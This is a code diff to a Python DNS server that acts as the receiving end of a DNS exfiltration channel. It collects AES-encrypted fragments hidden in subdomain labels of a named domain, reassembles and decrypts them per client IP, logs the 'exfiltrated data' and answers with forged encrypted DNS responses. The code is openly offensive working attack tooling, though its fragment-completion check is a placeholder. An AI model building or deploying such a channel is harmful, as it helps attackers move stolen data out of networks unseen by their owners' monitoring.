@@ -10,9 +10,9 @@ import time
 # Constants
 PORT = 53
 DOMAIN = "sub.brightbuys.me"  # Replace with your target domain
-SAVE_PATH = "./logs"  # Directory to save the client logs yeattt
+SAVE_PATH = "./logs"  # Directory to save client logs
 
-# Dict to store client-specific data (AES keys, log file path)
+# Dict to store client-specific data (AES keys, log file path, fragments)
 clients = {}
 
 
@@ -49,14 +49,22 @@ def log_client_data(client_ip, data):
 # Function to create a new client entry (AES key and log file)
 def create_new_client(client_ip):
     aes_key = get_random_bytes(32)  # Generate a unique AES key for the client
-    log_file = os.path.join(SAVE_PATH, f"{client_ip}.log")  # Create the log file for the client that he dont have yet
+    log_file = os.path.join(SAVE_PATH, f"{client_ip}.log")  # Create a log file for the client
 
     clients[client_ip] = {
         'aes_key': aes_key,
-        'log_file': log_file
+        'log_file': log_file,
+        'fragments': []  # Initialize empty fragment list for this client
     }
 
     print(f"New client detected: {client_ip}. AES key generated and log file created: {log_file}")
+
+
+# Function to check if all fragments are received (simple length check)
+def is_full_message_received(fragments):
+    # Implement your logic to check whether all fragments have been received
+    # Here we assume a fixed number of fragments for simplicity
+    return len(fragments) > 1  # Replace with real logic as needed
 
 
 # Function to handle DNS response based on the query type
@@ -84,9 +92,7 @@ def forge_dns_response(pkt, rdata="", rcode=0):
 # DNS Packet handler for processing client queries
 def handle_dns_packet(packet):
     if packet.haslayer(DNS) and packet[DNS].opcode == 0:  # DNS query
-        print(f"Packet: {packet}")
         domain = packet[DNSQR].qname.decode().lower()
-        print(f"domain: {domain}")
 
         # Check if the labels are too long (DNS label limit is 63 characters)
         labels = domain.split('.')
@@ -102,31 +108,29 @@ def handle_dns_packet(packet):
             create_new_client(client_ip)
 
         aes_key = clients[client_ip]['aes_key']
-        
-        print(DOMAIN)
-        print(domain)
 
         if DOMAIN in domain:
-            encrypted_data = domain.replace(f"{DOMAIN}", "")
+            encrypted_fragment = domain.replace(f"{DOMAIN}", "")
             
-            # Debugging
-            # decrypted_data = encrypted_data
-            # print(f"decrypted after replacement: {decrypted_data}")
-            
-            decrypted_data = decrypt_aes(encrypted_data, aes_key)
+            print(f"fragment: {encrypted_fragment}")
+            # Store fragments until the full message is received
+            clients[client_ip]['fragments'].append(encrypted_fragment)
 
-            if decrypted_data:
-                print(f"Exfiltrated data from {client_ip} (decrypted): {decrypted_data}")
-                log_client_data(client_ip, decrypted_data)
+            # Assume some condition to check if all fragments have been received
+            if is_full_message_received(clients[client_ip]['fragments']):
+                full_message = ''.join(clients[client_ip]['fragments'])
+                decrypted_data = decrypt_aes(full_message, aes_key)
+                if decrypted_data:
+                    print(f"Exfiltrated data from {client_ip} (decrypted): {decrypted_data}")
+                    log_client_data(client_ip, decrypted_data)
 
-                response_data = f"Received: {decrypted_data}"
-            
-                encrypted_response = encrypt_aes(response_data, aes_key, get_random_bytes(16))
-                # encrypted_response = response_data
+                    response_data = f"Received: {decrypted_data}"
+                    encrypted_response = encrypt_aes(response_data, aes_key, get_random_bytes(16))
+                    forge_dns_response(packet, rdata=encrypted_response)
 
-                forge_dns_response(packet, rdata=encrypted_response)
+                clients[client_ip]['fragments'] = []  # Clear fragments after processing
             else:
-                print(f"Decryption failed for client {client_ip} with domain: {domain}")
+                print(f"Waiting for more fragments from {client_ip}")
         else:
             print(f"Unrelated DNS request from {client_ip}: {domain}")
 
